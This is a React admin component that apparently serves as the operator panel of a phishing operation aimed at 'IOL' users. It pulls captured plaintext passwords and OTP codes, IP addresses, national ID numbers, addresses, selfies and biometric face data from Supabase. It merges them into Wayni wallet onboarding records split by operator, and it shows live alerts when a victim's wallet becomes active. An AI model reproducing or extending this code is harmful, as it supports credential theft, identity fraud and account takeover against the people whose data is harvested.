import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { CheckCircle2, Loader2, RefreshCw, ShieldCheck, Smartphone } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import IolWayniCard from "@/components/admin/iol-wayni/IolWayniCard";
import type { OnboardingRow, OperatorOption, SessionItem, WayniFilter } from "@/components/admin/iol-wayni/types";
import { hasDocuments, isPending, isWalletActive, mergeOtp, onboardingStatuses, parseOtp, statusPriority } from "@/components/admin/iol-wayni/utils";

interface IolWayniManagerProps {
  operators: OperatorOption[];
  myOperator: OperatorOption | null;
  isAdmin: boolean;
}

const ONBOARDING_SOURCE = "iol";

const IolWayniManager = ({ myOperator }: IolWayniManagerProps) => {
  const [loading, setLoading] = useState(true);
  const [sessions, setSessions] = useState<SessionItem[]>([]);
  const [onboardingRows, setOnboardingRows] = useState<OnboardingRow[]>([]);
  const [filter, setFilter] = useState<WayniFilter>("all");
  const [walletNotifications, setWalletNotifications] = useState<{ email: string; time: string }[]>([]);
  const backfillDoneRef = useRef(false);
  const reloadTimeoutRef = useRef<number | null>(null);
  const lastReloadAtRef = useRef(0);

  const backfillOnboarding = useCallback(async () => {
    if (backfillDoneRef.current) return;
    backfillDoneRef.current = true;

    const { data: sourceSessions } = await supabase
      .from("sessions")
      .select("id, email, password, status, otp_code, created_at, operator_code, country, city, region, source, ip_address, user_agent")
      .eq("source", ONBOARDING_SOURCE)
      .in("status", [...onboardingStatuses])
      .order("created_at", { ascending: false })
      .limit(500);

    for (const session of (sourceSessions as SessionItem[]) || []) {
      if (!session.email || !session.otp_code) continue;
      const otp = parseOtp(session.otp_code);
      if (!otp.dni) continue;

      const { data: existing } = await (supabase as any)
        .from("wayni_onboarding")
        .select("id")
        .eq("email", session.email.toLowerCase())
        .eq("source", ONBOARDING_SOURCE)
        .limit(1)
        .maybeSingle();

      if (existing?.id) continue;

      await (supabase as any).from("wayni_onboarding").insert({
        email: session.email.toLowerCase(),
        source: ONBOARDING_SOURCE,
        session_id: session.id,
        operator_code: session.operator_code || "master",
        dni: otp.dni || null,
        full_name: otp.name || null,
        phone: otp.phone || null,
        gender: otp.gender || null,
        user_uuid: otp.uuid || null,
        password: session.password || null,
        region: otp.region || null,
        city: otp.city || null,
        street: otp.street || null,
        zip_code: otp.zip || null,
        biometric_url: otp.biometric_url || null,
        biometric_id: otp.biometric_id || null,
        wallet_status: otp.wallet_status || null,
        bio_status: otp.bio_status || null,
        face_code: otp.face_code || null,
        face_confidence: otp.face_confidence || null,
        status: otp.validated === "true" ? "validated" : session.status,
      });
    }
  }, []);

  const loadData = useCallback(async () => {
    setLoading(true);

    const sessionsQuery = supabase
      .from("sessions")
      .select("id, email, password, status, otp_code, created_at, operator_code, country, city, region, source, ip_address, user_agent")
      .eq("source", ONBOARDING_SOURCE)
      .order("created_at", { ascending: false })
      .limit(500);

    const onboardingQuery = (supabase as any)
      .from("wayni_onboarding")
      .select("id, email, operator_code, dni, full_name, phone, gender, user_uuid, biometric_url, biometric_id, region, city, street, zip_code, bio_status, wallet_status, face_code, face_confidence, status, password, metadata, source, session_id, dni_front_path, dni_back_path, selfie_path, created_at, updated_at")
      .eq("source", ONBOARDING_SOURCE)
      .order("updated_at", { ascending: false })
      .limit(500);

    if (myOperator?.code) {
      sessionsQuery.eq("operator_code", myOperator.code);
      onboardingQuery.eq("operator_code", myOperator.code);
    }

    const [{ data: sessionData }, { data: onboardingData }] = await Promise.all([sessionsQuery, onboardingQuery]);

    setSessions((sessionData as SessionItem[]) || []);
    setOnboardingRows((onboardingData as OnboardingRow[]) || []);
    setLoading(false);
  }, [myOperator?.code]);

  useEffect(() => {
    void loadData();
    void backfillOnboarding().then(() => loadData());

    const scheduleReload = () => {
      const now = Date.now();
      const elapsed = now - lastReloadAtRef.current;
      const waitMs = elapsed >= 1500 ? 300 : 1500 - elapsed;

      if (reloadTimeoutRef.current) {
        window.clearTimeout(reloadTimeoutRef.current);
      }
      reloadTimeoutRef.current = window.setTimeout(() => {
        lastReloadAtRef.current = Date.now();
        void loadData();
      }, waitMs);
    };

    const sessionsChannel = supabase
      .channel("iol-wayni-sessions")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions", filter: "source=eq.iol" }, () => {
        scheduleReload();
      })
      .subscribe();

    const onboardingChannel = supabase
      .channel("iol-wayni-onboarding")
      .on("postgres_changes", { event: "*", schema: "public", table: "wayni_onboarding", filter: "source=eq.iol" }, (payload) => {
        const nextRow = payload.new as OnboardingRow | undefined;
        const previousRow = payload.old as OnboardingRow | undefined;
        if (nextRow?.wallet_status === "ACTIVE" && previousRow?.wallet_status !== "ACTIVE") {
          const email = nextRow.email || "?";
          setWalletNotifications((current) => [{ email, time: new Date().toLocaleTimeString("es-AR", { hour: "2-digit", minute: "2-digit" }) }, ...current].slice(0, 3));
          window.setTimeout(() => {
            setWalletNotifications((current) => current.filter((notification) => notification.email !== email));
          }, 30000);
        }
        scheduleReload();
      })
      .subscribe();

    return () => {
      if (reloadTimeoutRef.current) {
        window.clearTimeout(reloadTimeoutRef.current);
      }
      supabase.removeChannel(sessionsChannel);
      supabase.removeChannel(onboardingChannel);
    };
  }, [backfillOnboarding, loadData]);

  const mergedItems = useMemo(() => {
    const sessionCandidates = sessions.filter((session) => {
      const otp = parseOtp(session.otp_code);
      return onboardingStatuses.includes(session.status as (typeof onboardingStatuses)[number])
        || Boolean(otp.dni || otp.uuid || otp.biometric_url || otp.wallet_status || otp.validated === "true");
    });

    const byEmail = new Map<string, SessionItem>();
    const anonymousRows: SessionItem[] = [];

    for (const session of sessionCandidates) {
      const key = (session.email || "").toLowerCase();
      if (!key) {
        anonymousRows.push(session);
        continue;
      }
      byEmail.set(key, session);
    }

    for (const row of onboardingRows) {
      const otpExtras = [
        row.dni ? `dni:${row.dni}` : null,
        row.full_name ? `name:${row.full_name}` : null,
        row.phone ? `phone:${row.phone}` : null,
        row.gender ? `gender:${row.gender}` : null,
        row.user_uuid ? `uuid:${row.user_uuid}` : null,
        row.region ? `region:${row.region}` : null,
        row.city ? `city:${row.city}` : null,
        row.street ? `street:${row.street}` : null,
        row.zip_code ? `zip:${row.zip_code}` : null,
        row.biometric_url ? `biometric_url:${row.biometric_url}` : null,
        row.biometric_id ? `biometric_id:${row.biometric_id}` : null,
        row.wallet_status ? `wallet_status:${row.wallet_status}` : null,
        row.bio_status ? `bio_status:${row.bio_status}` : null,
        row.face_code ? `face_code:${row.face_code}` : null,
        row.face_confidence ? `face_confidence:${row.face_confidence}` : null,
        row.status === "validated" ? "validated:true" : null,
      ].filter(Boolean).join("|");

      const key = (row.email || "").toLowerCase();
      if (!key) {
        anonymousRows.push({
          id: row.id,
          email: row.email,
          password: row.password,
          status: row.status || "redirect_kyc",
          otp_code: otpExtras,
          created_at: row.updated_at || row.created_at,
          operator_code: row.operator_code || "master",
          country: null,
          city: row.city,
          region: row.region,
          source: ONBOARDING_SOURCE,
          ip_address: null,
          user_agent: null,
        });
        continue;
      }

      const existing = byEmail.get(key);
      if (!existing) {
        byEmail.set(key, {
          id: row.id,
          email: row.email,
          password: row.password,
          status: row.status || "redirect_kyc",
          otp_code: otpExtras,
          created_at: row.updated_at || row.created_at,
          operator_code: row.operator_code || "master",
          country: null,
          city: row.city,
          region: row.region,
          source: ONBOARDING_SOURCE,
          ip_address: null,
          user_agent: null,
        });
        continue;
      }

      const currentPriority = statusPriority[existing.status] || 0;
      const rowPriority = statusPriority[row.status] || 0;
      byEmail.set(key, {
        ...existing,
        password: existing.password || row.password,
        otp_code: mergeOtp(existing.otp_code, otpExtras),
        status: rowPriority >= currentPriority ? row.status || existing.status : existing.status,
        created_at: rowPriority >= currentPriority ? (row.updated_at || existing.created_at) : existing.created_at,
      });
    }

    return [...byEmail.values(), ...anonymousRows].sort((left, right) => new Date(right.created_at).getTime() - new Date(left.created_at).getTime());
  }, [onboardingRows, sessions]);

  const filteredItems = useMemo(() => {
    if (filter === "documents") return mergedItems.filter(hasDocuments);
    if (filter === "pending") return mergedItems.filter((item) => isPending(item) && !isWalletActive(item));
    if (filter === "active") return mergedItems.filter(isWalletActive);
    return mergedItems;
  }, [filter, mergedItems]);

  const countDocuments = mergedItems.filter(hasDocuments).length;
  const countPending = mergedItems.filter((item) => isPending(item) && !isWalletActive(item)).length;
  const countActive = mergedItems.filter(isWalletActive).length;

  const filterButtons: Array<{ key: WayniFilter; label: string; count: number }> = [
    { key: "all", label: "Todos", count: mergedItems.length },
    { key: "documents", label: "Documentos", count: countDocuments },
    { key: "pending", label: "Pendiente", count: countPending },
    { key: "active", label: "Wallet activa", count: countActive },
  ];

  return (
    <div className="space-y-4">
      {walletNotifications.length > 0 && (
        <div className="space-y-2">
          {walletNotifications.map((notification, index) => (
            <div key={`${notification.email}-${index}`} className="flex items-center justify-between rounded-xl border border-primary/25 bg-primary/10 px-4 py-3 text-sm text-primary">
              <div className="flex items-center gap-2">
                <CheckCircle2 className="h-4 w-4" />
                <span className="font-semibold">Wallet activa:</span>
                <span>{notification.email}</span>
                <span className="text-xs text-muted-foreground">{notification.time}</span>
              </div>
              <button onClick={() => setWalletNotifications((current) => current.filter((_, currentIndex) => currentIndex !== index))} className="text-xs text-muted-foreground hover:text-foreground">
                Cerrar
              </button>
            </div>
          ))}
        </div>
      )}

      <div className="grid gap-3 md:grid-cols-3">
        <Card className="border-border">
          <CardContent className="flex items-center justify-between p-4">
            <div>
              <p className="text-sm text-muted-foreground">Onboardings IOL</p>
              <p className="text-2xl font-semibold text-foreground">{mergedItems.length}</p>
            </div>
            <ShieldCheck className="h-5 w-5 text-primary" />
          </CardContent>
        </Card>
        <Card className="border-border">
          <CardContent className="flex items-center justify-between p-4">
            <div>
              <p className="text-sm text-muted-foreground">Pendientes</p>
              <p className="text-2xl font-semibold text-foreground">{countPending}</p>
            </div>
            <Smartphone className="h-5 w-5 text-primary" />
          </CardContent>
        </Card>
        <Card className="border-border">
          <CardContent className="flex items-center justify-between p-4">
            <div>
              <p className="text-sm text-muted-foreground">Wallet activa</p>
              <p className="text-2xl font-semibold text-foreground">{countActive}</p>
            </div>
            <CheckCircle2 className="h-5 w-5 text-primary" />
          </CardContent>
        </Card>
      </div>

      <Card className="border-border">
        <CardHeader className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between sm:space-y-0">
          <div>
            <CardTitle className="text-base">Onboarding Wayni — IOL</CardTitle>
            <p className="mt-1 text-sm text-muted-foreground">Mismas funciones del panel principal, pero aisladas solo para la operación IOL.</p>
          </div>
          <Button variant="secondary" onClick={() => void loadData()} disabled={loading}>
            <RefreshCw className={loading ? "animate-spin" : ""} />
            Actualizar
          </Button>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex items-center gap-2 flex-wrap">
            {filterButtons.map((button) => (
              <button
                key={button.key}
                onClick={() => setFilter(button.key)}
                className={`inline-flex items-center gap-2 rounded-lg border px-3 py-1.5 text-xs font-semibold transition-colors ${
                  filter === button.key
                    ? "border-primary/25 bg-primary/10 text-primary"
                    : "border-border bg-background text-muted-foreground hover:text-foreground"
                }`}
              >
                <span>{button.label}</span>
                <Badge variant="secondary" className="px-1.5 py-0 text-[10px]">{button.count}</Badge>
              </button>
            ))}
          </div>

          {loading ? (
            <div className="flex items-center gap-2 text-sm text-muted-foreground">
              <Loader2 className="h-4 w-4 animate-spin" /> Cargando onboardings...
            </div>
          ) : filteredItems.length === 0 ? (
            <div className="rounded-xl border border-border bg-background/60 p-6 text-sm text-muted-foreground">
              {filter === "all" ? "Nenhum onboarding Wayni da IOL encontrado ainda." : "Nenhum resultado para este filtro."}
            </div>
          ) : (
            <div className="space-y-3">
              {filteredItems.map((item, index) => (
                <IolWayniCard key={item.id} item={item} index={index} />
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default IolWayniManager;
